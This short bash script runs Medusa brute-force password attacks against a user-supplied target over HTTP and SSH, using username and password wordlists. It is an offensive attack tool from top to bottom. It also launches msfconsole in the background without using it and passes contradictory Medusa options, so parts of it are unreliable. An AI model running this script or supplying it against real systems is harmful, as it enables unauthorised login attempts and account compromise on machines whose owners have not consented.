#!/bin/bash

# Medusa Brute Force Script

# Run msfconsole
msfconsole -q &

# Wait for msfconsole to start
sleep 5

# Prompt the user for the target machine's IP address
read -p "Enter the target machine's IP address: " target_ip

# Prompt the user to choose a password text file and input its path
read -p "Enter the path to the password text file: " password_file

# Prompt the user to choose a user names text file and input its path
read -p "Enter the path to the user names text file: " username_file

# Prompt the user to choose protocols
echo "Choose protocols to exploit:"
echo "1. HTTP"
echo "2. SSH"
read -p "Enter the number(s) of the protocols (e.g., 1 2): " protocol_choices

# Iterate over protocol choices
for choice in $protocol_choices; do
    case $choice in
        1)
            # HTTP Brute Force
            echo "Running Medusa for HTTP brute force..."
            medusa -h $target_ip -u FILE -U $username_file -p FILE -P $password_file -M http -m DIR:/ -T 10 -n 80
            ;;
        2)
            # SSH Brute Force
            echo "Running Medusa for SSH brute force..."
            medusa -h $target_ip -u FILE -U $username_file -p FILE -P $password_file -M ssh -T 10 -n 22
            ;;
        *)
            # Invalid choice
            echo "Invalid choice. Skipping unknown protocol."
            ;;
    esac
done

# Cleanup
echo "Cleaning up..."
pkill -f msfconsole  # Stop msfconsole

